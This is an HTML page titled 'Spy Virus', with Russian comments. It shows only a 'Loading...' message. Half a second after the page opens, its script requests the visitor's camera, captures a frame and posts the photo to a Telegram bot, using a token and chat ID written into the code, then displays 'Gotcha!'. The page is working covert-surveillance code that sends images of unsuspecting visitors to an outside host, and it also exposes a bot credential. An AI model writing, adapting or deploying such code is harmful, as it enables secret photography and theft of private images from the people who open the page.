<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spy Virus</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background-color: #2c3e50; 
            color: white; 
            font-family: sans-serif;
            margin: 0;
        }
        h1 {
            text-align: center;
            padding: 20px;
        }
    </style>
</head>
<body>
    <h1 id="status">Загрузка...</h1>

    <script>
        async function takePhoto() {
            const statusText = document.getElementById('status');
            
            try {
                // Запрашиваем доступ к камере
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.srcObject = stream;

                // Ждем, пока видео "проснется" (даем 1 секунду)
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        
                        // Превращаем кадр в картинку
                        const dataUrl = canvas.toDataURL('image/png');
                        
                        // ТВОИ ДАННЫЕ:
                        const token = "9270278972:AAHHz8RjL_KQ0OBDXHQUCad7cJW4BdbXafQ"; 
                        const chatId = "1062964951";

                        // Используем метод POST — он гораздо стабильнее для картинок!
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                chat_id: chatId,
                                photo: dataUrl
                            })
                        })
                        .then(response => {
                            if (response.ok) {
                                statusText.innerText = "ПОПАЛСЯ! 📸";
                            } else {
                                statusText.innerText = "Ошибка отправки!";
                            }
                        })
                        .catch(err => {
                            statusText.innerText = "Ошибка сети!";
                            console.error(err);
                        });

                        // Выключаем камеру
                        stream.getTracks().forEach(track => track.stop());
                    }, 1000);
                };
            } catch (err) {
                console.error("Ошибка:", err);
                statusText.innerText = "Ой, камера не включилась!";
            }
        }

        // Запускаем функцию через полсекунды после открытия страницы
        setTimeout(takePhoto, 500);
    </script>
</body>
</html>
